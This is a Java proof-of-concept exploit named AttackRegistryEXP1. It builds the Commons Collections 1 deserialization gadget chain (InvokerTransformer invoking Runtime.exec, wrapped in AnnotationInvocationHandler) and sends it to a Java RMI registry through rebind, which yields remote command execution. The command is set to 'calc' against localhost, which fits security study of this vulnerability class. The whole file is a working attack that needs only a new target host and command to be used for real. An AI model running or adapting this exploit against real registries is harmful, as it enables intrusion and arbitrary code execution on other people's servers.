import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class AttackRegistryEXP1 {
    public static void main(String[] args) throws Exception{
        // 获取Registry
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        // 生成恶意payload
        InvocationHandler invocationHandler = (InvocationHandler) CC1();
        // 将恶意payload包装成Remote代理对象
        Remote remote = (Remote) Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{ Remote.class },
                invocationHandler
        );
        // 发起请求
//        registry.bind("test",remote);
        registry.rebind("test",remote);
    }
    public static Object CC1() throws Exception{
        String command = "calc";
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{command})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","value");
        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
        return annotationInvocationHandler;
    }
}
